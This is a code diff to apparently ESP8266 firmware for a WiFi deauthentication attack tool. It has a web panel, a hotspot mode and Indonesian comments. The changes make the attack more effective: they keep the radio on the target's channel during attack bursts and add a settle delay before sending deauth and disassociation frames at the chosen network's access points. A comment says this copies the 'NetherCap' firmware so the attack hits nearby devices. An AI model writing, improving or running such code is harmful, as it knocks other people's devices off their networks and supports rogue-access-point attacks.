@@ -329,6 +329,7 @@ void stopHotspot(){
 
 void stopAll(){
   deauthing_active = false;
+  wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
   if(hotspot_active) stopHotspot();
   oledStatus("semua stop");
 }
@@ -569,7 +570,11 @@ void handleIndex(){
 
   if(webServer.hasArg("deauth")){
     if(webServer.arg("deauth") == "start"){ deauthing_active = true;  oledStatus("deauth ON"); }
-    else                                 { deauthing_active = false; oledStatus("deauth off"); }
+    else {
+      deauthing_active = false;
+      wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);   // baru balik kanal
+      oledStatus("deauth off");
+    }
     webServer.send(200, "text/html", panelHtml());
     return;
   }
@@ -668,6 +673,7 @@ void deauthBurst(){
     if(_networks[i].ssid != _selectedNetwork.ssid) continue;
     if(_networks[i].ch == 0) continue;
     wifi_set_channel(_networks[i].ch);
+    delay(4);                        // radio perlu settle setelah pindah kanal
     sendFrame(_networks[i].bssid, 0xC0, 7);
     sendFrame(_networks[i].bssid, 0xC0, 1);
     sendFrame(_networks[i].bssid, 0xA0, 7);
@@ -682,7 +688,9 @@ void deauthBurst(){
       sendFrame(_selectedNetwork.bssid, 0xA0, r);
     }
   }
-  wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
+  // TIDAK kembali ke kanal 1 selama menyerang: firmware NetherCap asli juga
+  // parkir di kanal target, itu sebabnya deauth-nya kena device sekitar.
+  if(!deauthing_active) wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
 }
 
 void loop(){
